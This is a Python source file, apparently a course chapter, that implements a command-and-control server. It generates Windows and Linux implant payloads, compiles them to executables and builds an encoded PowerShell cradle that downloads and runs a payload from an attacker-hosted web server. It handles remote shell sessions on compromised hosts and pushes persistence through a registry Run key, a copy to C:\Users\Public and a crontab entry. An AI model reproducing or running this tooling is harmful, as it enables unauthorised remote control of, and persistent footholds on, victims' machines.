#Chapter 17

import os, os.path
import shutil
import sys
import socket
import threading
from prettytable import PrettyTable
import time
import random
import string
from datetime import datetime
import shutil
import subprocess
import base64

def help():
    print('''
     
 _____                                                 _                                 
/  __ \                                               | |                                
| /  \/  ___   _ __ ___   _ __ ___    __ _  _ __    __| | ___                            
| |     / _ \ | '_ ` _ \ | '_ ` _ \  / _` || '_ \  / _` |/ __|                           
| \__/\| (_) || | | | | || | | | | || (_| || | | || (_| |\__ \                           
 \____/ \___/ |_| |_| |_||_| |_| |_| \__,_||_| |_| \__,_||___/                           
 ______  ______  ______  ______  ______  ______  ______  ______                          
|______||______||______||______||______||______||______||______|                         
                                                                                         
----------------------------------------------------------------------------------------
listeners -g                            --> Genereate a new listener
winplant py                             --> Generate a Windows Compatible Python Payload
linplant py                             --> Generate a Linux Compatible Python Payload
exeplant                                --> Generate an executable payload for Windows
sessions -l                             --> List sessions
sessions -i <val>                       --> Enter a new session
kill <val>                              --> Kills an active session

Session Commands
----------------------------------------------------------------------------------------
background                              --> Backgrounds the current sessions
exit                                    --> Terminates the current session
    ''')
def pshell_cradle():
    web_server_ip = input("[+] Web server listening host: ")
    web_server_port = input("[+] Web server port: ")
    payload_name = input("[+] Payload name: ")
    runner_file = (''.join(random.choices(string.ascii_lowercase, k=6)))
    runner_file = f'{runner_file}.txt'
    randomized_exe_file = (''.join(random.choices(string.ascii_lowercase, k=6)))
    randomized_exe_file = f'{randomized_exe_file}.exe'
    print(f'[+] Run the following command to start a web server.\npython3 -m http.server -b {web_server_ip} {web_server_port}')
    runner_val_unencoded = f"iex (new-object net.webclient).downloadstring('http://{web_server_ip}:{web_server_port}/{runner_file}')".encode('utf-16le')
    with open(runner_file, 'w') as f:
        f.write(f'powershell -c wget http://{web_server_ip}:{web_server_port}/{payload_name} -outfile {randomized_exe_file}; Start-Process -FilePath {randomized_exe_file}')
        f.close()
    bs4_runner_cal = base64.b64encode(runner_val_unencoded)
    bs4_runner_cal = bs4_runner_cal.decode()
    print(f'\n[+] Encoded payload\n\npowershell -e {bs4_runner_cal}')
    bs4_runner_cal_decoded = base64.b64decode(bs4_runner_cal).decode()
    print(f'\n[+] Unencoded payload\n\n{bs4_runner_cal_decoded}')

def winplant():
    #Payload random name generator
    ran_name = (''.join(random.choices(string.ascii_lowercase, k=6)))
    file_name = f'{ran_name}.py'

    #Get current directory
    check_cwd = os.getcwd()

    #Check if paylaod exists and if exists, copy it to the name of othe new file
    if os.path.exists(f'{check_cwd}\\winplant.py'):
        shutil.copy('winplant.py', file_name)
    else:
        print('[-] winplant.py file not found.')
    with open(file_name) as f:
        new_host = f.read().replace('INPUT_IP_HERE', host_ip)
    with open(file_name, 'w') as f:
        f.write(new_host)
        f.close()
    with open(file_name) as f:
        new_port = f.read().replace('INPUT_PORT_HERE', host_port)
    with open(file_name, 'w') as f:
        f.write(new_port)
        f.close()
    # path check commands in payload handling
    if os.path.exists(f'{file_name}'):
        print(f'[+] {file_name} saved to {check_cwd}')
    else:
        print('[-] Some error occurred with generation.')

def linplant():
    ran_name = (''.join(random.choices(string.ascii_lowercase, k=6)))
    file_name = f'{ran_name}.py'

    #Get current directory
    check_cwd = os.getcwd()

    #Check if paylaod exists and if exists, copy it to the name of othe new file
    if os.path.exists(f'{check_cwd}\\linplant.py'):
        shutil.copy('linplant.py', file_name)
    else:
        print('[-] linplant.py file not found.')
    with open(file_name) as f:
        new_host = f.read().replace('INPUT_IP_HERE', host_ip)
    with open(file_name, 'w') as f:
        f.write(new_host)
        f.close()
    with open(file_name) as f:
        new_port = f.read().replace('INPUT_PORT_HERE', host_port)
    with open(file_name, 'w') as f:
        f.write(new_port)
        f.close()
    #path check commands in payload handling
    if os.path.exists(f'{file_name}'):
        print(f'[+] {file_name} saved to {check_cwd}')
    else:
        print('[-] Some error occurred with generation.')

def exeplant():
    ran_name = (''.join(random.choices(string.ascii_lowercase, k=6)))
    file_name = f'{ran_name}.py'
    exe_file = f'{ran_name}.exe'

    # Get current directory
    check_cwd = os.getcwd()

    # Check if paylaod exists and if exists, copy it to the name of othe new file
    if os.path.exists(f'{check_cwd}\\winplant.py'):
        shutil.copy('winplant.py', file_name)
    else:
        print('[-] winplant.py file not found.')
    with open(file_name) as f:
        new_host = f.read().replace('INPUT_IP_HERE', host_ip)
    with open(file_name, 'w') as f:
        f.write(new_host)
        f.close()
    with open(file_name) as f:
        new_port = f.read().replace('INPUT_PORT_HERE', host_port)
    with open(file_name, 'w') as f:
        f.write(new_port)
        f.close()
    #pyinstaller command handling
    pyinstaller_exec = f'pyinstaller {file_name} -w --clean --onefile --distpath .'
    print(f'[+] Compiling executable {exe_file}...')
    #stderr=subprocess.DEVNULL is to remove verbosity.
    subprocess.call(pyinstaller_exec, stderr=subprocess.DEVNULL)
    #Remove unnecessary files
    os.remove(f'{ran_name}.spec')
    shutil.rmtree('build')
    #Check if the new executable has been created.
    if os.path.exists(f'{check_cwd}\\{exe_file}'):
        print(f'[+] {exe_file} saved to current directory.')
    else:
        print('[-] Some error occured during generation.')

def banner():
    print("┌┐ ┬ ┬╦  ┌─┐┬─┐┌─┐┌┬┐")
    print("├┴┐└┬┘║  │ │├┬┘├┤  │")
    print("└─┘ ┴ ╩═╝└─┘┴└─└─┘ ┴")

def comm_in(targ_id):
    print('[+] Awaiting response...')
    response = targ_id.recv(4096).decode()
    response = base64.b64decode(response)
    response = response.decode().strip()
    return response

def comm_out(targ_id, message):
    message = str(message)
    message = base64.b64encode(bytes(message, encoding='utf8'))

    targ_id.send(message)

def kill_sig(targ_id, message):
    message = str(message)
    message = base64.b64encode(bytes(message, encoding='utf8'))
    targ_id.send(message)

def target_comm(targ_id, targets, num):
    while True:
        message = input(f'{targets[num][3]}/{targets[num][1]}#>')
        if len(message) == 0:
            continue
        if message == "help":
            pass
        else:
            comm_out(targ_id, message)
        if message == 'exit':
            message = base64.b64encode(message.encode())
            targ_id.send(message)
            targ_id.close()
            targets[num][7] = "Dead"
            break
        if message == 'background':
            break
        if message == "help":
            pass
        if message == 'persist':
            payload_name = input("[+] Enter the name of the payload to add to persistence: ")
            print(f'Payload name: {payload_name}')
            if targets[num][6] == 1:
                persist_command_1 = f'cmd.exe /c move {payload_name} C:\\Users\\Public\\Win32.exe'
                #persist_command_1 = f'cmd.exe /c copy {payload_name} C:\\Users\\Public'
                persist_command_1 = base64.b64encode(persist_command_1.encode())
                targ_id.send(persist_command_1)
                #persist_command_3 = f'cmd.exe /c del {payload_name}'
                #persist_command_3 = base64.b64encode(persist_command_3.encode())
                #targ_id.send(persist_command_3)
                persist_command_2 = f'reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v screendoor /t REG_SZ /d C:\\Users\\Public\\Win32.exe'
                persist_command_2 = base64.b64encode(persist_command_2.encode())
                targ_id.send(persist_command_2)
                persist_command_4 = f'powershell -command \"Start-Process -FilePath \"C:\\Users\\Public\\Win32.exe"'
                persist_command_4 = base64.b64encode(persist_command_4.encode())
                targ_id.send(persist_command_4)
                print("[+] Run this command to clean up the registry: \nreg delete HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v screendoor /f")
            if targets[num][6] == 2:
                persist_command = f'echo "*/1 * * * * python3 /home/{targets[num][3]}/{payload_name}" | crontab -'
                persist_command = base64.b64encode(persist_command.encode())
                targ_id.send(persist_command)
                print('[+] Run this command to clean up the crontab: \n crontab -r')
        else:
            response = comm_in(targ_id)
            if response == "exit":
                print('[-] The client has terminated the session.')
                targ_id.close()
                break
            print(response)

def comm_handler():
    # Remote_ip returns a tupple of the IP and the Port, so if you use remote_ip[0], only the ip will be returned.
    while True:
        if kill_flag == 1:
            break
        try:
            remote_target, remote_ip = sock.accept()
            username = remote_target.recv(1024).decode()
            username = base64.b64decode(username).decode()
            admin = remote_target.recv(1024).decode()
            admin = base64.b64decode(admin).decode()
            op_sys = remote_target.recv(4096).decode()
            op_sys = base64.b64decode(op_sys).decode()
            if admin == 1:
                admin_val = "Yes"
            else:
                admin_val = "No"

            if "Windows" in op_sys:
                pay_val = 1
            else:
                pay_val = 2
            cur_time = time.strftime("%H:%M:%S", time.localtime())
            date = datetime.now()
            time_record = (f"{date.month}/{date.day}/{date.year} {cur_time}")
            host_name = socket.gethostbyaddr(remote_ip[0])
            if host_name is not None:
                targets.append([remote_target, f"{host_name[0]}@{remote_ip[0]}", time_record, username, admin_val, op_sys, pay_val, 'Active'])
                print(f'[+] Connection reveived from {host_name[0]}@{remote_ip[0]}\nEnter command#>')
            else:
                targets.append([remote_target, remote_ip[0], time_record, username, admin_val, op_sys, pay_val, 'Active'])
                print(f'[+] Connection reveived from {remote_ip[0]}\nEnter command#>')

        except:
            pass



def listener_handler():
    sock.bind((host_ip, int(host_port)))
    print("[+] Awaiting connection from client...")
    sock.listen()
    #Initializes the thread and runs it in the background
    t1 = threading.Thread(target=comm_handler)
    #After the thread is initialized, it redirects bacj to the While loop from the main functionality.
    t1.start()

if __name__ == '__main__':
    targets = []
    listener_counter = 0
    #Kill the while loop in comm_handler
    kill_flag = 0
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            command = input("Enter command>")
            if command == "help":
                help()

            if command == "listeners -g":
                host_ip = input('[+] Enter the IP to listen on: ')
                host_port = input('[+] Enter the port to listen on: ')
                listener_handler()
                listener_counter += 1
            if command == "winplant py":
                if listener_counter > 0:
                    winplant()
                else:
                    print("[-] You cannot generate a payload with an active listener")
            if command == "linplant py":
                if listener_counter > 0:
                    linplant()
                else:
                    print("[-] You cannot generate a payload with an active listener")
            if command == "exeplant":
                if listener_counter > 0:
                    exeplant()
                else:
                    print("[-] You cannot generate a payload with an active listener")
            if command == "pshell_shell":
                pshell_cradle()
            if command == "exit":
                quit_message = input("Ctrl-C\n [+] Do you really want to quit? (y/n)").lower()
                if quit_message == 'y':
                    tar_len = len(targets)
                    for target in targets:
                        if target[7] == "Dead":
                            pass
                        else:
                            comm_out(target[0], "exit")
                    kill_flag = 1
                    if listener_counter > 0:
                        sock.close()

                    break
                else:
                    continue
            if command == "kill":
                try:
                    num = int(command.split(" ")[1])
                    targ_id = (targets[num][0])
                    if (targets[num])[7] == "Active":
                        targets[num][7] = "Dead"
                        print(f'[+] Session {num} terminated.')
                    else:
                        print("[-] You cannot interact with a dead session.")
                except(IndexError, ValueError):
                    print(f'[-] Session {num} does not exist.')

            if command.split(" ")[0] == "sessions":
                session_counter = 0
                #List sessions command handling
                if command.split(" ")[1] == "-l":
                    myTable = PrettyTable()
                    myTable.field_names = ['Session', 'Status', 'Username', 'Admin', 'Target', 'Operating System', 'Check-In Time']
                    myTable.padding_width = 3
                    for target in targets:
                        myTable.add_row([session_counter, target[7], target[3], target[4], target[1], target[5], target[2]])
                        session_counter += 1
                    print(myTable)
                if command.split(" ")[1] == '-i':
                    try:
                        num = int(command.split(" ")[2])
                        targ_id = (targets[num])[0]
                        if targets[num][7] == "Active":
                            target_comm(targ_id, targets, num)
                        else:
                            print(f"[-] You cannot interact with a dead session.")
                    except IndexError:
                        print(f'[-] Session {num} does not exist')
        except KeyboardInterrupt:
            quit_message = input("Ctrl-C\n [+] Do you really want to quit? (y/n)").lower()
            if quit_message == 'y':
                tar_len = len(targets)
                for target in targets:
                    if target[7] == "Dead":
                        pass
                    else:
                        comm_out(target[0], "exit")
                kill_flag = 1
                if listener_counter > 0:
                    sock.close()

                break
            else:
                continue
